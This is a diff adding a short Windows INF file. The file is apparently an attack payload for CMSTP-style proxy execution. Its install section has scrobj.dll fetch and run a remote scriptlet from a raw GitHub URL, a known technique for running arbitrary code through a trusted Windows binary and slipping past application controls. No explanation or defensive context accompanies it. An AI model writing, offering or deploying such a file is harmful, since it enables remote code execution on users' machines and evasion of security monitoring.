@@ -1,0 +1,14 @@
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/QuangNguyenTheChick/Shell-scripts/master/test.sct
+
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Yay"
+ShortSvcName="Yay"
